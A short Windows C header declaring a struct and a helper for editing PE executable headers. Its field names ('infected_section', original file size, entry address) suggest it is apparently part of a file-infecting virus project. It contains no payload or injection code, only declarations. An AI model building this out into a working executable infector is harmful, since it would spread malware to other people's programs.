#pragma once
#include <Windows.h>

#define ROUND_TO_SECTION_ALIGNMENT(number){\
                    number -= number % 0x1000;\
                    number += 0x1000;\
                    }

struct Exe_file
{
    HANDLE handle;
    LPBYTE mapped_handle;
    PIMAGE_DOS_HEADER dosHeader;
    PIMAGE_NT_HEADERS headers;
    PIMAGE_SECTION_HEADER infected_section;
    DWORD entry_address;
    DWORD origianal_file_size;
    DWORD file_size;
};

typedef struct Exe_file EXE_file;

DWORD set_exe_headers(EXE_file*);
